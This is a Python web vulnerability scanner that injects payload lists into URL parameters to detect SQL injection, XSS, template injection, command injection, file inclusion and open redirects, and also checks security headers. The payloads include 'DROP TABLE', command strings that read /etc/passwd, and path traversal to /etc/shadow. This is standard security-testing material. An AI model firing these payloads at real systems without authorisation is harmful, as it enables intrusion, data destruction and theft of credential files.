#!/usr/bin/env python3
"""
Web Vulnerability Scanner
=========================
WHAT THIS DOES:
    Scans web applications for common vulnerabilities:
    - SQL Injection (SQLi)
    - Cross-Site Scripting (XSS)
    - Command Injection
    - Local File Inclusion (LFI)
    - Open Redirects
    - Security header misconfigurations

WHY IT MATTERS:
    Web apps are the #1 initial access vector. OWASP Top 10 vulns
    account for the vast majority of breaches. Finding just ONE SQLi
    or command injection gives you a foothold.

    Real operators use Burp Suite (commercial) or OWASP ZAP (free).
    We're building the detection logic from scratch.

HOW IT WORKS:
    1. Crawl the target to find URLs with parameters
    2. For each parameter, inject test payloads
    3. Check the response for indicators of vulnerability:
       - SQLi: database error messages in response
       - XSS: our payload reflected back unescaped
       - Command injection: output of injected command appears
       - LFI: contents of /etc/passwd or win.ini appear

USAGE:
    python3 vulnscan.py http://target.com
    python3 vulnscan.py http://target.com/page?id=1 --sqli
    python3 vulnscan.py http://target.com --all
    python3 vulnscan.py http://target.com --headers  # check security headers
"""

import sys
import argparse
import urllib.request
import urllib.parse
import urllib.error
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


# ── SQL Injection Detection ──

SQLI_PAYLOADS = [
    # Error-based: trigger database errors that leak info
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    # Time-based blind: if the page takes longer to respond, it's vulnerable
    "1' AND SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    # Boolean-based blind
    "1' AND '1'='1",
    "1' AND '1'='2",
]

SQLI_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"mysql_query",
    # PostgreSQL
    r"pg_query",
    r"pg_exec",
    r"valid PostgreSQL result",
    r"unterminated quoted string",
    # MSSQL
    r"microsoft.*odbc.*sql server",
    r"unclosed quotation mark after the character string",
    r"mssql_query",
    # SQLite
    r"sqlite3\.OperationalError",
    r"near \".*\": syntax error",
    r"SQLITE_ERROR",
    # Oracle
    r"quoted string not properly terminated",
    r"ORA-\d+",
    # Generic
    r"SQL syntax.*error",
    r"sql error",
    r"syntax error.*sql",
    r"database error",
    r"SQLSTATE",
    r"Warning.*\Wmysqli?_",
    r"Warning.*\Wpg_",
]


# ── XSS Detection ──

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<body onload=alert("XSS")>',
    '{{7*7}}',  # Template injection (returns 49)
    '${7*7}',   # Template injection variant
    '<img src=x onerror=prompt(1)>',
    '"><img src=x onerror=alert(1)>',
]


# ── Command Injection Detection ──

CMDI_PAYLOADS = [
    # Unix
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    # Windows
    "& whoami",
    "| dir",
    "& dir C:\\",
    # Blind (time-based)
    "; sleep 5",
    "| sleep 5",
    "& ping -c 5 127.0.0.1",
]

CMDI_INDICATORS = [
    r"uid=\d+",           # Unix id command output
    r"root:.*:0:0:",      # /etc/passwd content
    r"www-data",
    r"bin/bash",
    r"Volume Serial Number",  # Windows dir output
    r"Directory of",
    r"\\Windows\\",
]


# ── LFI Detection ──

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "....//....//....//etc/shadow",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index",
    "../../../etc/hosts",
]

LFI_INDICATORS = [
    r"root:.*:0:0:",
    r"\[fonts\]",         # win.ini
    r"\[extensions\]",    # win.ini
    r"localhost",         # /etc/hosts
    r"/bin/bash",
    r"/usr/sbin/nologin",
]


# ── Open Redirect Detection ──

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%2F%2F",
]


# ── Security Headers ──

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "description": "Forces HTTPS connections",
        "severity": "HIGH",
        "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains",
    },
    "Content-Security-Policy": {
        "description": "Prevents XSS and injection attacks",
        "severity": "HIGH",
        "recommendation": "Add a restrictive CSP policy",
    },
    "X-Frame-Options": {
        "description": "Prevents clickjacking",
        "severity": "MEDIUM",
        "recommendation": "Add: X-Frame-Options: DENY",
    },
    "X-Content-Type-Options": {
        "description": "Prevents MIME sniffing",
        "severity": "LOW",
        "recommendation": "Add: X-Content-Type-Options: nosniff",
    },
    "X-XSS-Protection": {
        "description": "Browser XSS filter",
        "severity": "LOW",
        "recommendation": "Add: X-XSS-Protection: 1; mode=block",
    },
    "Referrer-Policy": {
        "description": "Controls referrer information leakage",
        "severity": "LOW",
        "recommendation": "Add: Referrer-Policy: strict-origin-when-cross-origin",
    },
    "Permissions-Policy": {
        "description": "Controls browser feature permissions",
        "severity": "LOW",
        "recommendation": "Add: Permissions-Policy: camera=(), microphone=()",
    },
}


def fetch(url, timeout=10):
    """Fetch a URL and return (status, headers, body)."""
    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        response = urllib.request.urlopen(req, timeout=timeout)
        body = response.read().decode("utf-8", errors="ignore")
        return response.status, dict(response.headers), body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)


def inject_param(url, param, payload):
    """Replace a URL parameter's value with a payload."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if param not in params:
        return url

    params[param] = [payload]
    new_query = urllib.parse.urlencode(params, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def find_params(url):
    """Extract parameter names from a URL."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return list(params.keys())


def crawl_forms(url, body):
    """Extract form actions and input names from HTML."""
    forms = []

    # Find forms
    form_pattern = re.compile(
        r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
        re.DOTALL | re.IGNORECASE,
    )
    input_pattern = re.compile(
        r'<input[^>]*name=["\']([^"\']*)["\']',
        re.IGNORECASE,
    )

    for match in form_pattern.finditer(body):
        action = match.group(1)
        form_body = match.group(2)
        inputs = input_pattern.findall(form_body)

        # Resolve relative URLs
        if action.startswith("/"):
            parsed = urllib.parse.urlparse(url)
            action = f"{parsed.scheme}://{parsed.netloc}{action}"
        elif not action.startswith("http"):
            action = f"{url.rstrip('/')}/{action}"

        forms.append({"action": action, "inputs": inputs})

    return forms


def test_sqli(url, param, timeout=10):
    """Test a parameter for SQL injection."""
    findings = []

    # Get baseline response
    _, _, baseline_body = fetch(url, timeout)

    for payload in SQLI_PAYLOADS:
        test_url = inject_param(url, param, payload)
        status, headers, body = fetch(test_url, timeout)

        # Check for SQL error messages
        for pattern in SQLI_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                findings.append({
                    "type": "SQL Injection (Error-based)",
                    "param": param,
                    "payload": payload,
                    "evidence": re.search(pattern, body, re.IGNORECASE).group(),
                    "severity": "CRITICAL",
                    "url": test_url,
                })
                return findings  # One finding is enough

    # Boolean-based detection: compare responses
    true_url = inject_param(url, param, "1' AND '1'='1")
    false_url = inject_param(url, param, "1' AND '1'='2")
    _, _, true_body = fetch(true_url, timeout)
    _, _, false_body = fetch(false_url, timeout)

    if true_body != false_body and len(true_body) != len(false_body):
        size_diff = abs(len(true_body) - len(false_body))
        if size_diff > 50:  # Significant difference
            findings.append({
                "type": "SQL Injection (Boolean-based blind)",
                "param": param,
                "payload": "1' AND '1'='1 vs 1' AND '1'='2",
                "evidence": f"Response size difference: {size_diff} bytes",
                "severity": "CRITICAL",
                "url": true_url,
            })

    return findings


def test_xss(url, param, timeout=10):
    """Test a parameter for Cross-Site Scripting."""
    findings = []

    for payload in XSS_PAYLOADS:
        test_url = inject_param(url, param, payload)
        _, _, body = fetch(test_url, timeout)

        # Check if payload is reflected back unescaped
        if payload in body:
            findings.append({
                "type": "Cross-Site Scripting (Reflected XSS)",
                "param": param,
                "payload": payload,
                "evidence": "Payload reflected unescaped in response",
                "severity": "HIGH",
                "url": test_url,
            })
            return findings

        # Check for template injection
        if payload == "{{7*7}}" and "49" in body:
            findings.append({
                "type": "Server-Side Template Injection (SSTI)",
                "param": param,
                "payload": payload,
                "evidence": "Template expression {{7*7}} evaluated to 49",
                "severity": "CRITICAL",
                "url": test_url,
            })
            return findings

    return findings


def test_cmdi(url, param, timeout=10):
    """Test a parameter for Command Injection."""
    findings = []

    for payload in CMDI_PAYLOADS:
        test_url = inject_param(url, param, payload)
        _, _, body = fetch(test_url, timeout)

        for pattern in CMDI_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                findings.append({
                    "type": "Command Injection",
                    "param": param,
                    "payload": payload,
                    "evidence": re.search(pattern, body, re.IGNORECASE).group(),
                    "severity": "CRITICAL",
                    "url": test_url,
                })
                return findings

    return findings


def test_lfi(url, param, timeout=10):
    """Test a parameter for Local File Inclusion."""
    findings = []

    for payload in LFI_PAYLOADS:
        test_url = inject_param(url, param, payload)
        _, _, body = fetch(test_url, timeout)

        for pattern in LFI_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                findings.append({
                    "type": "Local File Inclusion (LFI)",
                    "param": param,
                    "payload": payload,
                    "evidence": re.search(pattern, body, re.IGNORECASE).group(),
                    "severity": "CRITICAL",
                    "url": test_url,
                })
                return findings

    return findings


def test_open_redirect(url, param, timeout=10):
    """Test a parameter for Open Redirect."""
    findings = []

    for payload in REDIRECT_PAYLOADS:
        test_url = inject_param(url, param, payload)
        try:
            req = urllib.request.Request(test_url)
            req.add_header("User-Agent", "Mozilla/5.0")
            # Don't follow redirects
            opener = urllib.request.build_opener(
                urllib.request.HTTPRedirectHandler()
            )
            response = opener.open(req, timeout=timeout)

            # Check if redirected to our payload
            if hasattr(response, 'url') and "evil.com" in response.url:
                findings.append({
                    "type": "Open Redirect",
                    "param": param,
                    "payload": payload,
                    "evidence": f"Redirected to: {response.url}",
                    "severity": "MEDIUM",
                    "url": test_url,
                })
                return findings

        except urllib.error.HTTPError as e:
            location = e.headers.get("Location", "")
            if "evil.com" in location:
                findings.append({
                    "type": "Open Redirect",
                    "param": param,
                    "payload": payload,
                    "evidence": f"Location header: {location}",
                    "severity": "MEDIUM",
                    "url": test_url,
                })
                return findings
        except Exception:
            pass

    return findings


def check_headers(url, timeout=10):
    """Check for missing security headers."""
    _, headers, _ = fetch(url, timeout)
    findings = []

    for header, info in SECURITY_HEADERS.items():
        if header.lower() not in {k.lower() for k in headers}:
            findings.append({
                "type": f"Missing Security Header: {header}",
                "param": "N/A",
                "payload": "N/A",
                "evidence": info["description"],
                "severity": info["severity"],
                "url": url,
                "recommendation": info["recommendation"],
            })

    # Check for info leakage headers
    server = headers.get("Server", "")
    if server:
        findings.append({
            "type": "Server Version Disclosure",
            "param": "Server header",
            "payload": "N/A",
            "evidence": f"Server: {server}",
            "severity": "LOW",
            "url": url,
            "recommendation": "Remove or obfuscate the Server header",
        })

    powered_by = headers.get("X-Powered-By", "")
    if powered_by:
        findings.append({
            "type": "Technology Disclosure",
            "param": "X-Powered-By header",
            "payload": "N/A",
            "evidence": f"X-Powered-By: {powered_by}",
            "severity": "LOW",
            "url": url,
            "recommendation": "Remove the X-Powered-By header",
        })

    return findings


def scan(url, tests=None, timeout=10):
    """
    Run full vulnerability scan against a URL.

    Args:
        url: Target URL with parameters (e.g., http://target.com/page?id=1)
        tests: List of test types to run (sqli, xss, cmdi, lfi, redirect, headers)
        timeout: Request timeout
    """
    if tests is None:
        tests = ["sqli", "xss", "cmdi", "lfi", "redirect", "headers"]

    start_time = datetime.now()
    all_findings = []

    print(f"\n[*] Target: {url}")
    print(f"[*] Tests:  {', '.join(tests)}")
    print(f"[*] Started: {start_time.strftime('%H:%M:%S')}\n")

    # Check security headers
    if "headers" in tests:
        print("[*] Checking security headers...")
        findings = check_headers(url, timeout)
        all_findings.extend(findings)
        if findings:
            for f in findings:
                print(f"  [{f['severity']}] {f['type']}")

    # Find parameters to test
    params = find_params(url)

    if not params:
        print("[!] No URL parameters found to test")
        print("[*] Tip: provide a URL with parameters, e.g., http://target.com/page?id=1")

        # Try to crawl for forms
        print("[*] Crawling for forms...")
        _, _, body = fetch(url, timeout)
        forms = crawl_forms(url, body)
        if forms:
            print(f"  [+] Found {len(forms)} forms")
            for form in forms:
                print(f"      Action: {form['action']}, Fields: {', '.join(form['inputs'])}")
    else:
        print(f"[*] Parameters found: {', '.join(params)}\n")

        test_map = {
            "sqli": ("SQL Injection", test_sqli),
            "xss": ("XSS", test_xss),
            "cmdi": ("Command Injection", test_cmdi),
            "lfi": ("Local File Inclusion", test_lfi),
            "redirect": ("Open Redirect", test_open_redirect),
        }

        for param in params:
            print(f"[*] Testing parameter: {param}")

            for test_name, (label, test_func) in test_map.items():
                if test_name not in tests:
                    continue

                print(f"  [*] {label}...", end=" ", flush=True)
                findings = test_func(url, param, timeout)

                if findings:
                    all_findings.extend(findings)
                    for f in findings:
                        print(f"\n  [!] {f['severity']}: {f['type']}")
                        print(f"      Payload: {f['payload']}")
                        print(f"      Evidence: {f['evidence']}")
                else:
                    print("clean")

    duration = (datetime.now() - start_time).total_seconds()

    # Final report
    print(f"\n{'='*60}")
    print(f"Vulnerability Scan Report")
    print(f"{'='*60}")
    print(f"Target:   {url}")
    print(f"Duration: {duration:.1f}s")

    if not all_findings:
        print("\nNo vulnerabilities found.")
        print("Note: This scanner tests common patterns. Manual testing")
        print("with Burp Suite is recommended for thorough assessment.")
    else:
        # Group by severity
        by_severity = {}
        for f in all_findings:
            by_severity.setdefault(f["severity"], []).append(f)

        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            if severity not in by_severity:
                continue
            findings = by_severity[severity]
            print(f"\n[{severity}] — {len(findings)} findings:")
            for f in findings:
                print(f"  • {f['type']}")
                if f["param"] != "N/A":
                    print(f"    Parameter: {f['param']}")
                    print(f"    Payload:   {f['payload']}")
                print(f"    Evidence:  {f['evidence']}")
                if "recommendation" in f:
                    print(f"    Fix:       {f['recommendation']}")

        print(f"\nTotal: {len(all_findings)} findings")
        critical = len(by_severity.get("CRITICAL", []))
        if critical:
            print(f"CRITICAL findings: {critical} — immediate action required")

    return all_findings


def main():
    parser = argparse.ArgumentParser(description="Web Vulnerability Scanner")
    parser.add_argument("url", help="Target URL (e.g., http://target.com/page?id=1)")
    parser.add_argument("--sqli", action="store_true", help="Test for SQL injection only")
    parser.add_argument("--xss", action="store_true", help="Test for XSS only")
    parser.add_argument("--cmdi", action="store_true", help="Test for command injection only")
    parser.add_argument("--lfi", action="store_true", help="Test for LFI only")
    parser.add_argument("--redirect", action="store_true", help="Test for open redirects")
    parser.add_argument("--headers", action="store_true", help="Check security headers only")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--timeout", type=float, default=10)

    args = parser.parse_args()

    # Determine which tests to run
    tests = []
    if args.all or not any([args.sqli, args.xss, args.cmdi, args.lfi,
                            args.redirect, args.headers]):
        tests = ["sqli", "xss", "cmdi", "lfi", "redirect", "headers"]
    else:
        if args.sqli: tests.append("sqli")
        if args.xss: tests.append("xss")
        if args.cmdi: tests.append("cmdi")
        if args.lfi: tests.append("lfi")
        if args.redirect: tests.append("redirect")
        if args.headers: tests.append("headers")

    scan(args.url, tests=tests, timeout=args.timeout)


if __name__ == "__main__":
    main()
